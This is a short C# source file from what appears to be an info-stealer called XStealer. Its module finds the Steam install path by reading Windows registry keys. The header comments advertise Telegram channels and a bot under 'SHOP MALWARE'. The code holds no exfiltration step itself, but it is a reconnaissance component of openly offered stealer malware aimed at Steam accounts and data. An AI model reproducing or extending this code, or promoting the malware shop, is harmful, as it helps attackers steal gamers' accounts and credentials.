// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Steam
{
    using System;
    using Microsoft.Win32;

    public static class SteamPath
    {
        private const string STPATHUPBIT = @"SOFTWARE\Wow6432Node\Valve\Steam", STPATHLOWBIT = @"Software\Valve\Steam",
        INST = "InstallPath", SOURCE = "SourceModInstallPath";

        public static string GetLocationSteam()
        {
            try
            {
                using var BaseSteam = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
                using RegistryKey Key = BaseSteam?.OpenSubKey(STPATHUPBIT, Environment.Is64BitOperatingSystem);
                using RegistryKey Key2 = BaseSteam?.OpenSubKey(STPATHLOWBIT, Environment.Is64BitOperatingSystem);
                return Key?.GetValue(INST)?.ToString() ?? Key2?.GetValue(SOURCE)?.ToString();
            }
            catch { }
            return string.Empty;
        }
    }
}